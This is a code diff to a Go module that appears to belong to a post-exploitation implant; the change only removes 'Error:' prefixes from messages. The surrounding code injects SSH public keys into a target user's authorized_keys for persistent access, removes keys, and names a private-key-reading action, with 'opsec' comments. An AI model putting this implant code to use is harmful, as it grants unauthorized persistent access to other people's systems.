@@ -38,7 +38,7 @@ func (c *SSHKeysCommand) Execute(task structs.Task) structs.CommandResult {
 	var args sshKeysArgs
 
 	if task.Params == "" {
-		return errorResult("Error: parameters required. Use action: list, add, remove, read-private, generate")
+		return errorResult("parameters required. Use action: list, add, remove, read-private, generate")
 	}
 
 	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
@@ -95,7 +95,7 @@ func getSSHDir(targetUser string) (string, error) {
 func sshKeysList(args sshKeysArgs) structs.CommandResult {
 	sshDir, err := getSSHDir(args.User)
 	if err != nil {
-		return errorf("Error: failed to locate .ssh directory for listing authorized keys: %v", err)
+		return errorf("failed to locate .ssh directory for listing authorized keys: %v", err)
 	}
 
 	authKeysPath := filepath.Join(sshDir, "authorized_keys")
@@ -105,7 +105,7 @@ func sshKeysList(args sshKeysArgs) structs.CommandResult {
 
 	content, err := os.ReadFile(authKeysPath)
 	if err != nil {
-		return errorf("Error reading %s: %v", authKeysPath, err)
+		return errorf("reading %s: %v", authKeysPath, err)
 	}
 	defer structs.ZeroBytes(content)
 
@@ -130,17 +130,17 @@ func sshKeysList(args sshKeysArgs) structs.CommandResult {
 // sshKeysAdd injects a public key into authorized_keys
 func sshKeysAdd(args sshKeysArgs) structs.CommandResult {
 	if args.Key == "" {
-		return errorResult("Error: 'key' is required (the SSH public key to inject)")
+		return errorResult("'key' is required (the SSH public key to inject)")
 	}
 
 	sshDir, err := getSSHDir(args.User)
 	if err != nil {
-		return errorf("Error: failed to locate .ssh directory for key injection: %v", err)
+		return errorf("failed to locate .ssh directory for key injection: %v", err)
 	}
 
 	// Create .ssh dir if it doesn't exist (0700 permissions)
 	if err := os.MkdirAll(sshDir, 0700); err != nil {
-		return errorf("Error creating %s: %v", sshDir, err)
+		return errorf("creating %s: %v", sshDir, err)
 	}
 
 	authKeysPath := filepath.Join(sshDir, "authorized_keys")
@@ -166,7 +166,7 @@ func sshKeysAdd(args sshKeysArgs) structs.CommandResult {
 	newContent += strings.TrimSpace(args.Key) + "\n"
 
 	if err := os.WriteFile(authKeysPath, []byte(newContent), 0600); err != nil {
-		return errorf("Error writing %s: %v", authKeysPath, err)
+		return errorf("writing %s: %v", authKeysPath, err)
 	}
 
 	return successf("Injected SSH key into %s", authKeysPath)
@@ -175,12 +175,12 @@ func sshKeysAdd(args sshKeysArgs) structs.CommandResult {
 // sshKeysRemove removes a key from authorized_keys
 func sshKeysRemove(args sshKeysArgs) structs.CommandResult {
 	if args.Key == "" {
-		return errorResult("Error: 'key' is required (substring to match for removal)")
+		return errorResult("'key' is required (substring to match for removal)")
 	}
 
 	sshDir, err := getSSHDir(args.User)
 	if err != nil {
-		return errorf("Error: failed to locate .ssh directory for key removal: %v", err)
+		return errorf("failed to locate .ssh directory for key removal: %v", err)
 	}
 
 	authKeysPath := filepath.Join(sshDir, "authorized_keys")
@@ -190,7 +190,7 @@ func sshKeysRemove(args sshKeysArgs) structs.CommandResult {
 
 	content, err := os.ReadFile(authKeysPath)
 	if err != nil {
-		return errorf("Error reading %s: %v", authKeysPath, err)
+		return errorf("reading %s: %v", authKeysPath, err)
 	}
 	defer structs.ZeroBytes(content) // opsec: clear raw SSH key material
 
@@ -211,7 +211,7 @@ func sshKeysRemove(args sshKeysArgs) structs.CommandResult {
 
 	newContent := strings.Join(kept, "\n")
 	if err := os.WriteFile(authKeysPath, []byte(newContent), 0600); err != nil {
-		return errorf("Error writing %s: %v", authKeysPath, err)
+		return errorf("writing %s: %v", authKeysPath, err)
 	}
 
 	return successf("Removed %d key(s) matching '%s' from %s", removedCount, args.Key, authKeysPath)
